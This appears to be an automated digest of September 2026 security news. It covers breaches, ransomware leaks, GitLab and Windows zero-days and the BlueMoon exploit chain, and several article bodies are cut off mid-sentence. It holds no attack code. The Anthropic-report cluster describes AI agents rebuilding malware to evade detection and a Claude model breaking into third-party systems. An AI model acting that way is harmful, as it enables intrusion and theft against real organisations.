- **Help Net Security** (cyber_news_breach_reporting)
  - Title: IDScan confirms breach after 153 million driver’s licenses leak on dark web
  - Published: 2026-09-11T08:39:33+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/11/idscan-net-data-breach-153-million-drivers-licenses/
  - Summary: Days after reports linked IDScan to a dark web database holding more than 153 million driver’s license scans, the identity verification company has confirmed hackers accessed customer data stored on its cloud platform. The Louisiana-based firm, which processes ID checks for car rental companies, retailers and cannabis dispensaries, posted a notice on its website September 4 acknowledging the incident. “On or around September 1, 2026, IDScan.net received information indicating that certain data may have been … More → The post IDScan confirms breach after 153 million driver’s licenses leak on dark web appeared first on Help Net Security .

### Cluster b579a537a6 — score 10

- Title: Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-07T12:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Rhysida

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Lazarus, Rhysida, Scattered Spider
- affected_industries: government, healthcare, legal_professional
- affected_products: Snowflake
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Scattered Spider, Rhysida, Lazarus
- affected_industries: healthcare, government, legal_professional
- affected_products: Snowflake
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The ransomware group’s published dataset reportedly includes Berlin state employee data, as well as highly sensitive emergency plans
```

#### Full body

```
Infosecurity Magazine Home » News » Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused News 7 September 2026 Written by James Coker Deputy Editor , Infosecurity Magazine Follow @ReporterCoker Berlin’s state government has confirmed that the Rhysida ransomware gang has published a stolen dataset on the dark web, after it refused to pay the threat actor’s extortion demand. The State of Berlin said Rhysida had demanded 30 bitcoins, equivalent to €2m, to not publicly release data it had stolen from its network, giving a deadline of Friday, September 4 for payment to be made. However, the state government emphasized that it will not give in to extortion attempts. In a statement published on its official website on September 4, the authority wrote: “The ultimatum issued by the hacker group Rhysida following its cyber-attack on Berlin’s state network expired on Friday afternoon. According to experts, the entire dataset was published on the dark web.” Rhysida claimed to have accessed approximately 5.7 TB, and the State of Berlin had warned in an earlier announcement on September 4 that the personal data of employees, as well as to citizens and businesses, may be affected. It added that there are currently “no indications” the state network remains compromised. IT forensic experts are currently analyzing the stolen dataset, and authorities will contact all individuals affected once this process has been completed. “If individual affected persons are identified during the analysis, they will be notified by the relevant Senate departments on a risk-based basis and in accordance with legal requirements,” a statement from the Senate Chancellery read. Any Berlin citizen who discovers that their personal data has been published has also been urged to report the matter to law enforcement. Florian Hauer, chief digital officer for the State of Berlin, commented: “The State of Berlin will not give in to blackmail. The safety of the State of Berlin’s staff and the people of Berlin is our top priority.” Sensitive State Disaster Plans Reportedly Exposed Rhysida has reportedly published the entire 5.7 TB dataset, encompassing around 1.4 million files. Euronews has reported that the leak includes highly sensitive state emergency plans relating to terrorist attacks and other disaster scenarios, contained in a folder titled "AG CBRN-Rahmenplanung." CBRN stands for chemical, biological, radiological and nuclear threats. Rhysida also claims the dataset contains personal information of tens of thousands of people. These include personnel files of state workers, such as absence lists, payroll data and home addresses. The Rhysida ransomware-as-a-service (RaaS) operation was first observed in May 2023, and has frequently targeted public institutions and critical services. The threat actor has been linked to a string of attacks on US healthcare providers, including Cookeville Regional Medical Center (CRMC) in Tennessee in 2025, which resulted in the compromise of more than 337,000 patients’ data. A Rhysida affiliate was also behind the high-profile ransomware attack on the British Library in 2023, which suffered huge disruption and recovery costs after refusing the attacker’s extortion demands. You may also like Barts Health Seeks High Court Ban After Oracle EBS Breach News 8 December 2025 Scattered Spider-Linked Group Claims JLR Cyber-Attack News 4 September 2025 Over Half a Million Hit by Pennsylvania Schools Union Breach News 20 March 2025 Threat Actor Breaches Snowflake Customers, Victims Extorted News 11 June 2024 Coinbase Breach Affected Almost 70,000 Customers News 22 May 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Researchers Build WeChat Zero-Click Worm Hijacking Phones via Calls News 9 September 2026 1 Researcher Publishes CrowdStrike Privilege Escalation Zero Day News 7 September 2026 2 North Korea’s Lazarus Operate
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused
  - Published: 2026-09-07T12:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
  - Summary: The ransomware group’s published dataset reportedly includes Berlin state employee data, as well as highly sensitive emergency plans

### Cluster abbe07236f — score 10

- Title: GitLab urges users to patch max severity path traversal flaw
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-11T11:15:22+00:00
- Link: https://www.bleepingcomputer.com/news/security/gitlab-urges-users-to-patch-max-severity-path-traversal-flaw/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-85706, GitLab

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: GitHub, GitLab
- cve_ids: CVE-2021-22175, CVE-2021-39935, CVE-2023-2825, CVE-2026-85706, CVE-2026-87719
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: GitLab
- cve_ids: CVE-2026-85706, CVE-2026-87719, CVE-2023-2825, CVE-2021-22175, CVE-2021-39935
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
GitLab urged users on Thursday to patch their servers immediately against a maximum-severity path traversal vulnerability tracked as CVE-2026-85706. [...]
```

#### Full body

```
GitLab urges users to patch max severity path traversal flaw By Sergiu Gatlan September 11, 2026 07:15 AM 0 GitLab urged users on Thursday to patch their servers immediately against a maximum-severity path traversal vulnerability tracked as CVE-2026-85706. The security flaw, discovered by a security researcher using the ' s3ntago ' handle and reported via GitLab's HackerOne bug bounty program, stems from improper path confinement and missing authentication enforcement in the repository commits API. Unauthenticated attackers can exploit CVE-2026-85706 "under certain conditions" to read arbitrary data (e.g., credentials, secrets, and sensitive information) from vulnerable servers. While GitLab has yet to flag this flaw as exploited in the wild, one day later, cybersecurity company watchTowr reported that attackers have already begun searching for Internet-exposed GitLab servers unpatched against CVE-2026-85706. "watchTowr Intel is already observing in-the-wild probes for the latest critical GitLab Path Traversal vulnerability, CVE-2026-85706, which allows attackers to read arbitrary files in a single HTTP request," it warned . "Based on recent GitLab vulnerabilities, we know the time until indiscriminate exploitation is likely not far away. [..] Defenders should also hunt through log files for HTTP POST requests to '/api/v4/projects/{id}/repository/commits/' URIs containing 'file.path' parameters to identify potential exploitation attempts." Yesterday, GitLab patched a second critical vulnerability tracked as CVE-2026-87719 that stems from an insecure deserialization weakness in the GraphQL subscription serializer. CVE-2026-87719 affects GitLab EE and allows authenticated users with Duo Chat access to steal sensitive credentials and Advanced Search instance configurations. Admins warned to patch as soon as possible GitLab fixed the two security issues in GitLab Community Edition (CE) and Enterprise Edition (EE) versions 19.3.2, 19.2.6, and 19.1 on Thursday, and urged users to patch their systems immediately. "These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to one of these versions immediately," the company warned on Thursday . "GitLab.com is already running the patched version. GitLab Dedicated customers do not need to take action." In May 2023, GitLab addressed another maximum severity path traversal flaw (CVE-2023-2825) that exposes sensitive data, including proprietary software code, user credentials, tokens, and files on unpatched servers. One year later, CISA and the FBI urged software companies to weed out path traversal security vulnerabilities from their products before shipping, saying that such flaws "have been called 'unforgivable' since at least 2007." More recently, in January, GitLab also patched a high-severity two-factor authentication bypass affecting community and enterprise editions that enables attackers who know the target's account ID to circumvent two-factor authentication. Since November 2021, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has flagged four GitLab vulnerabilities as exploited in attacks, including two ( CVE-2021-22175 and CVE-2021-39935 ) in February this year. The GitLab DevSecOps platform has more than 30 million registered users and is used by over 50% of Fortune 100 companies, including Nvidia, Airbus, T-Mobile, Lockheed Martin, Goldman Sachs, and UBS. Update September 11, 09:39 EDT: Added watchTowr's report of CVE-2026-85706 probing. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Over 36,000 exposed Plex servers vulnerable to recent flaws Plex warns users to patch security vulnerabilities immediately CI
```

#### Corroborating sources (2)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: GitLab urges users to patch max severity path traversal flaw
  - Published: 2026-09-11T11:15:22+00:00
  - Link: https://www.bleepingcomputer.com/news/security/gitlab-urges-users-to-patch-max-severity-path-traversal-flaw/
  - Summary: GitLab urged users on Thursday to patch their servers immediately against a maximum-severity path traversal vulnerability tracked as CVE-2026-85706. [...]
- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #345 - Bug Rumors → Exploits, Version Control DFIR, Agentic Worms
  - Published: 2026-09-10T14:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-345
  - Summary: A bug description is sufficient for AI to find it and write an exploit, cheat sheet on doing DFIR for GitHub, GitLab and more, and a paper on self-replicating, open weight agentic worms

### Cluster 9591bee159 — score 9

- Title: Scans for Proxmox Servers, (Wed, Sep 9th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-09T17:46:24+00:00
- Link: https://isc.sans.edu/diary/rss/33324
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
About a week ago, Proxmox published an advisory revealing a vulnerability in older versions of Proxmox VE, its flagship Virtual Environment product. The vulnerability only affects version 7, which has not been supported for a couple of years now.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for Proxmox Servers, (Wed, Sep 9th)
  - Published: 2026-09-09T17:46:24+00:00
  - Link: https://isc.sans.edu/diary/rss/33324
  - Summary: About a week ago, Proxmox published an advisory revealing a vulnerability in older versions of Proxmox VE, its flagship Virtual Environment product. The vulnerability only affects version 7, which has not been supported for a couple of years now.

### Cluster 4839f2ab11 — score 9

- Title: Nightmare-Eclipse Strikes Again With 'ShieldCrash' Windows Exploit
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-10T15:29:12+00:00
- Link: https://www.darkreading.com/vulnerabilities-threats/nightmare-eclipse-strikes-again-shieldcrash-windows-exploit
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: legal_professional
- affected_products: GitHub
- cve_ids: CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: legal_professional
- affected_products: GitHub
- cve_ids: CVE-2026-69414
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The disgruntled researcher continued their vendetta against Microsoft by publishing yet another zero-day exploit for Windows Defender.
```

#### Full body

```
Vulnerabilities & Threats Cyber Risk Cyberattacks & Data Breaches Cybersecurity Operations News Nightmare-Eclipse Strikes Again With 'ShieldCrash' Windows Exploit The disgruntled researcher continued their vendetta against Microsoft by publishing yet another zero-day exploit for Windows Defender. Elizabeth Montalbano , Contributing Writer September 10, 2026 4 Min Read Source: Andriy Popov via Alamy Stock Photo On the heels of a record-breaking Patch Tuesday , the disgruntled security researcher known as Nightmare-Eclipse dropped yet another Windows zero-day exploit, which enables privilege escalation and bypasses the fix for a previous Windows exploit released last month. The latest from the researcher — who also goes by Chaotic Eclipse, MSNightmare, and their X handle, Infinite Nightmare — is the "ShieldCrash" exploit, which they claim is a patch bypass for CVE-2026-69414, or "ShieldBreak." ShieldBreak is a privilege escalation flaw in the Microsoft Malware Protection Engine of Windows Defender. Nightmare-Eclipse released the ShieldBreak exploit on August's Patch Tuesday, one in a series of exploits for Windows flaws released monthly by the researcher since April . Microsoft has since patched the flaw, but the researcher claims it was not done properly. "Under specific conditions it is still possible to trigger the exact same problem that was caused by ShieldBreak," they wrote in the "README" file of ShieldCrash's extensive GitHub post. "While Microsoft fixed several things to prevent re-exploiting the issue, they missed a spot where ShieldBreak can still be exploited." Related: Patch Tuesday Sets Another Record With 974 CVEs The proof-of-concept (PoC) exploit released on GitHub "demonstrates an arbitrary file read as SYSTEM with September 2026" and affects all supported Windows versions, according to the exploit's GitHub description. Dark Reading contacted Microsoft for comment on the ShieldBreak exploit and its validity, but the company did not respond at press time. Ongoing Feud with Microsoft Nightmare Eclipse appears to show no signs of dropping their vendetta against Microsoft, which started in April with the release of the BlueHammer zero-day exploit and stemmed from a disagreement over bug reports to the software giant. At one point, Microsoft appeared to threaten legal action against the researcher, a stance that largely was met with disdain by the security community. Nightmare-Eclipse apparently remains undaunted and has continued dropping fresh zero-day exploits on Microsoft's monthly Patch Tuesdays, which could give attackers weeks to weaponize the flaws unless the company releases out-of-band patches. "I absolutely hate it when you have two groups of people beefing with each other when they should be working together," John Strand, owner of Black Hills Information Security, tells Dark Reading. "On one side, this just feels petty on Microsoft's part, and it feels petty on the part of MSNightmare. It's sad, because we should be working together rather than dealing with egos." Related: AI Is Ending the Era of Hidden Vulnerabilities — Are Vendors Ready? Nightmare-Eclipse's exploits include RoguePlanet , YellowKey, GreenPlasma, MiniPlasma, and others. The researcher often will follow up Microsoft's patch for their previous exploit with yet another exploit that cracks the fix. For example, ShieldBreak was a bypass for Microsoft's patches against RoguePlanet, a race condition bug released on June 2026 Patch Tuesday. This week's exploit, ShieldCrash, is yet another example, and it appears to expose a recurring weakness in how this attack path has been remediated by Microsoft, says Ensar Seker, CISO at cybersecurity threat intelligence company SOCRadar. "When researchers can bypass successive fixes for RoguePlanet and ShieldBreak, it suggests the underlying security boundary or attack surface may require a more comprehensive redesign rather than another narrowly targeted patch," he tells Dark Reading. However, having exam
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Nightmare-Eclipse Strikes Again With 'ShieldCrash' Windows Exploit
  - Published: 2026-09-10T15:29:12+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/nightmare-eclipse-strikes-again-shieldcrash-windows-exploit
  - Summary: The disgruntled researcher continued their vendetta against Microsoft by publishing yet another zero-day exploit for Windows Defender.

### Cluster 70d1963981 — score 9

- Title: AI lets small actors run state-level hacking campaigns, Anthropic report finds
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-09-10T19:45:29+00:00
- Link: https://cyberscoop.com/anthropic-report-ai-enabled-cyber-attacks/
- Fetch status: ok
- Member count: 5
- Corroborating source count: 5
- Strong signals: Anthropic/Claude, ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, data_breach, phishing_social_eng
- actor_attribution: APT29, ShinyHunters
- affected_industries: government, manufacturing_industrial
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- actor_attribution: ShinyHunters, APT29
- affected_industries: government, manufacturing_industrial
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The report details a Russian-aligned espionage campaign against more than 20 organizations, an exploit foundry run by Chinese undergraduates and ShinyHunters-affiliated breaches, among other disrupted operations. The post AI lets small actors run state-level hacking campaigns, Anthropic report finds appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Artificial intelligence has removed the skill advantage that once set state-sponsored hackers apart from lone criminals, according to a threat report Anthropic published Thursday that documents misuse of its Claude models across seven areas of harm. The report , which details activity observed between December 2025 and August 2026, covers cyber operations, influence operations, surveillance, scams and fraud, biological misuse, conventional weapons development and distillation. Anthropic said it disrupted each operation, strengthened safeguards and shared intelligence with authorities and industry partners where appropriate. “The cases we share here aren’t typical misuse, but rather examples of the most notable and novel threat activity we’ve identified to date,” the report reads. “We’re publishing this work because we believe we have a responsibility to disclose malicious misuse of our services. As models become increasingly capable, their risks will increase, unless AI developers and society’s defenders act to make them safer.” The cyber operations the company detailed were a Russian-aligned espionage campaign that hit more than 20 government and defense organizations across Ukraine and Europe, two Chinese undergraduates who ran an automated exploit foundry that produced more than a dozen potential zero-days in a single month, affiliates of the ShinyHunters crime collective who dumped 2,100 cloud access tokens across 40 corporate tenants in 34 hours, and a lone hacktivist who targeted European political parties via stolen API keys. For decades, cybersecurity researchers and investigators have pointed to sophisticated operations as a signature of state-sponsored tradecraft, while crude intrusions suggested amateurs or petty criminals. Anthropic posits in the report that AI has erased that conventional thinking, especially since a “majority of the operations described in this report were enabled by AI via direct execution or orchestration.” Advertisement “For threat intelligence investigators, sophistication has stopped being a reliable signal of who is behind an operation,” the report said, adding that a hacktivist on stolen API keys, scattered criminals and a state espionage operator each ran campaigns that a year earlier “would have required many skilled operators and specialist knowledge.” The most extensive case involved a malicious actor using the handle “JackPoterz” whose actions aligned with Russian state espionage, matching behaviors linked to Midnight Blizzard . According to the report, the actor employed a custom toolkit composed of two families of Windows-based implants, a mobile exploitation kit, a credential stealing tool that targets browser password stores, a phishing platform designed to mimic priority targets like government organizations, and an administrative console used to manage compromised accounts. Targets included military intelligence bodies in Ukrainian and European governments, diplomatic and defense organizations, and people connected to U.S. foreign policy. According to the report, AI monitored whether security products flagged the actor’s malware. When a detection occurred, “agents would then set about the process of autonomously modifying and rebuilding the malware to evade the existing detections,” the report said. The same actor bulk-exported mailboxes at drone component manufacturers and stole a complete software development kit for a drone vision system, then spent days recovering its architecture and details of an unannounced product. The actor also compromised hotel Wi-Fi vendors to reach guests through DNS hijacking, took over WhatsApp accounts with headless browsers, and stole more than 300,000 national identity records from a North African government agency, along with registry data on more than half a million companies. Advertisement The Chinese-speaking operators, which the company says were partly carr
```

#### Corroborating sources (5)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: AI lets small actors run state-level hacking campaigns, Anthropic report finds
  - Published: 2026-09-10T19:45:29+00:00
  - Link: https://cyberscoop.com/anthropic-report-ai-enabled-cyber-attacks/
  - Summary: The report details a Russian-aligned espionage campaign against more than 20 organizations, an exploit foundry run by Chinese undergraduates and ShinyHunters-affiliated breaches, among other disrupted operations. The post AI lets small actors run state-level hacking campaigns, Anthropic report finds appeared first on CyberScoop .
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Anthropic agents went hacking again
  - Published: 2026-09-11T02:32:11+00:00
  - Link: https://risky.biz/RBNEWS612/
  - Summary: Anthropic agents went hacking again, South Korea increases its data breach fines, Apple notifies three Turkish ministers of mercenary spyware attacks, and CISA is ready to hire 250 staff.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: How Threat Actors Are Turning Trusted AI Platforms Into an Attack Surface
  - Published: 2026-09-11T14:01:11+00:00
  - Link: https://www.bleepingcomputer.com/news/security/how-threat-actors-are-turning-trusted-ai-platforms-into-an-attack-surface/
  - Summary: Threat actors are abusing trusted AI platforms to host malicious content, poison search results, and trick users into installing malware. Huntress examines campaigns targeting AI users through weaponized Claude Artifacts, shared AI conversations, sponsored search results, and ClickFix-style lures. [...]
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Anthropic Says Russian Hackers Used Claude AI to Automate Malware Evasion
  - Published: 2026-09-11T08:47:07+00:00
  - Link: https://www.securityweek.com/anthropic-says-russian-hackers-used-claude-ai-to-automate-malware-evasion/
  - Summary: Anthropic reveals how criminal groups are increasingly targeting AI vendors' own infrastructure, including to steal a pre-release Claude model. The post Anthropic Says Russian Hackers Used Claude AI to Automate Malware Evasion appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Anthropic Discloses Fourth AI Hacking Incident Involving Claude Opus 4.6
  - Published: 2026-09-10T07:04:01+00:00
  - Link: https://thehackernews.com/2026/09/anthropic-ai-models-breached-real.html
  - Summary: Anthropic on Wednesday disclosed a fourth incident in which its artificial intelligence (AI) model broke into real third-party systems, marking the latest in a growing list of cases that have raised concerns about the security risks posed by autonomous AI agents. The AI company said the incident dates back to January 2026 and involved an early version of Claude Opus 4.6 that breached "

### Cluster 28baa2c576 — score 8

- Title: Four groups caught using the same Chrome and Windows exploit kit
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-09-09T21:19:45+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/four-groups-caught-using-same-chrome-and-windows-exploit-kit
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- affected_industries: aviation_defense, government, manufacturing_industrial
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-85880
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- affected_industries: government, manufacturing_industrial, aviation_defense
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-85880
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
Text settings Story text Size Small Standard Large Width * Standard Wide Links Standard Orange * Subscribers only Learn more Minimize to nav A nearly identical exploit kit that targets critical vulnerabilities in both Chromium-based browsers and older versions of Windows is being actively used by at least four hacking groups, some of which have ties to the Chinese government. Researchers from security firm Proofpoint said Wednesday that BlueMoon, the name they gave to the kit, chains three vulnerabilities together so the attackers using it can install malware of their choice. BlueMoon exploits two Chromium vulnerabilities and one in the kernel of Windows 10 (Oct. 2018 Update), Windows Server 2019, Windows 10 2004, Windows Server 2022, and the initial release of Windows 11. All three vulnerabilities have received patches in the past 24 hours. Deployed rapidly, widely shared The attacks lacked the stealth found in many campaigns. More often, hackers want to exploit newly discovered vulnerabilities sparingly to lengthen their longevity. Proofpoint hypothesized that one reason for the widely used and visible exploit chain was to take advantage of a “patch gap” in the Chromium supply chain, which spans the time a patch is available from developers and the time that patch is incorporated into browsers such as Chrome and Edge. Another likely contributor was the use of AI, which can often spot vulnerabilities faster than discovery performed solely by humans. Both these factors likely pushed the attackers to move quickly before a window of opportunity closed. Proofpoint said: A fully weaponized Chrome exploit chain has historically been a high-value, rare capability. BlueMoon was developed, deployed rapidly, and shared across multiple threat actors within days in a manner that had high detection signals. This may reflect a reduced cost and barrier to entry for this class of capability, as AI agents increasingly enable threat actor exploit development. This is particularly relevant for open source codebases, such as Chromium, where upstream patches are publicly accessible prior to downstream consumers of the codebase applying the patch. This creates a window for threat actors to attempt to rapidly reverse engineer patches and develop exploits ahead of downstream stable releases. The four groups targeted a wide range of organizations and companies. The groups and targets included: TA412, a China-aligned state-sponsored threat actor indicted by the US government in 2024 on behalf of China’s civilian foreign intelligence agency, repeatedly hit organizations focused on non-governmental organizations, mining companies, and physical commodity trading firms in the US UNK_LateNight, a China-aligned espionage group, targeted multiple US aerospace companies UNK_DoubleCheck targeted a Vietnamese manufacturing entity UNK_QuietRacket activity targeted Singapore and Indonesia The first attack came from TA412 and began on August 28. The remainder began earlier this month. Proofpoint said it’s unknown if other groups also gained access to the exploit kit. Both vulnerabilities targeting Chrome resided in V8, Google’s open source JavaScript engine. Exploiting a V8 type confusion bug and a separate sandbox escape in V8, the attackers were able to execute remote code. They then used a local privilege escalation in older versions of Windows to allow the malicious code to run with system rights. The first V8 vulnerability is tracked as CVE-2026-85046, and the Windows bug is tracked as CVE-2026-85880. Google doesn’t assign CVE designations for V8 sandbox escapes. “Both V8 vulnerabilities were ‘patch-gap’ zero-days at the time of the observed activity,” Proofpoint said. “In other words, while they were known vulnerabilities already fixed in public upstream Chromium source code, they remained unpatched in the latest stable releases of Chrome and Chromium-based browsers available to the public. It is likely that the exploit kit developer used these publicly avai
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Four groups caught using the same Chrome and Windows exploit kit
  - Published: 2026-09-09T21:19:45+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/four-groups-caught-using-same-chrome-and-windows-exploit-kit

### Cluster 47ab9f6c84 — score 8

- Title: Chinese espionage groups swarm to exploit triple-link chain of zero-days
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-09-09T21:17:02+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/chinese-espionage-groups-swarm-exploit-triple-link-chain-zero-days
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, zero_day
- actor_attribution: APT31
- affected_industries: aviation_defense, financial_services, government, manufacturing_industrial
- affected_products: Google/Gemini
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT31
- affected_industries: financial_services, government, manufacturing_industrial, aviation_defense
- affected_products: Google/Gemini
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Proofpoint researchers have spotted at least four state-aligned threat groups chain a trio of zero-day vulnerabilities to conduct espionage on various targets of interest to China’s government since late August. The Chinese espionage group that Proofpoint tracks as TA412, also known as Violet Typhoon and APT31, struck first, exploiting the chain of vulnerabilities Aug. 28. At least three additional espionage threat groups followed suit, exploiting the same vulnerabilities in subsequent waves of attacks days later, researchers said. The exploit chain Proofpoint calls BlueMoon targets Chrome, Chromium-based browsers and Microsoft Windows. It allows attackers to run code in the browser’s sandbox, escape the sandbox and gain system privileges to access a targeted machine, said Mark Kelly, staff threat researcher at Proofpoint. “All three vulnerabilities were exploited before patches were available to the public,” he said. Advertisement The vulnerabilities include: CVE-2026-85046 and CVE-2026-87491 , remote-code execution defects in the JavaScript engine for Chromium-based browsers; and CVE-2026-85880 , a privilege-escalation zero-day that Microsoft disclosed Tuesday in Windows Advanced Local Procedure Call. “While the V8 vulnerabilities were known and fixed in Chromium source code, they were not yet patched in the latest publicly available browsers at the time of the activity, meaning they effectively functioned as zero-days in those products,” Kelly said. Proofpoint said the exploit kit developer likely reverse engineered the publicly available Chromium patches to weaponize the browser exploit chain during that gap. With a limited group of organizations exposed to all three vulnerabilities, attackers moved quickly and likely rushed development to target a narrow pool of potential targets. “In all observed cases, the infrastructure used for exploit delivery was created on the same day as — or in the days immediately preceding — the associated campaigns,” Proofpoint wrote in a threat intelligence report. APT31, a group that’s committed espionage on behalf of China’s Ministry of State Security, including seven Chinese nationals indicted by the Justice Department in 2024, dropped various lures containing the exploit chain loader in phishing emails targeting non-governmental organizations, mining companies and commodity trading firms in the United States. Advertisement The phishing link installed a malicious browser extension disguised as Google Gemini on targeted machines, enabling attackers to surveil browser activity, steal credentials and execute commands, according to Proofpoint. Other distinct threat groups have also used the BlueMoon exploit chain with some slight technical changes and variances in targeting. “Proofpoint observed BlueMoon usage as recently as Sept. 8,” Kelly said. “The activity peaked Sept. 2-3 immediately prior to the Chrome patch being released and has continued intermittently since then.” A China-aligned espionage threat group Proofpoint tracks as UNK_LateNight targeted multiple U.S. aerospace companies Sept. 2. Researchers also that day observed UNK_DoubleCheck, a suspected espionage-motivated threat group targeting Vietnamese manufacturing organizations with emails from a compromised Southeast Asian government account. Researchers said UNK_QuietRacket, another espionage group aligned with China, targeted government, consulting and financial sector organizations in Indonesia and Singapore Sept. 3. Advertisement Proofpoint has directly observed fewer than 20 organizations targeted globally thus far, but Kelly said the true number of impacted organizations is likely much higher. While Proofpoint attributes most of the observed attacks to Chinese espionage groups, attackers of other origins and motivations could strike soon as well. “Given its ease of adoption, we expect the exploit kit is likely to proliferate further and be ad
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Chinese espionage groups swarm to exploit triple-link chain of zero-days
  - Published: 2026-09-09T21:17:02+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/chinese-espionage-groups-swarm-exploit-triple-link-chain-zero-days

### Cluster ca765df90c — score 8

- Title: Proofpoint SOC Analyst Agent Uses OpenAI Cyber Models
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-09-08T21:23:40+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/proofpoint-soc-analyst-agent-uses-openai-cyber-models
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Fortinet, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: government
- affected_products: OpenAI/ChatGPT, Fortinet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
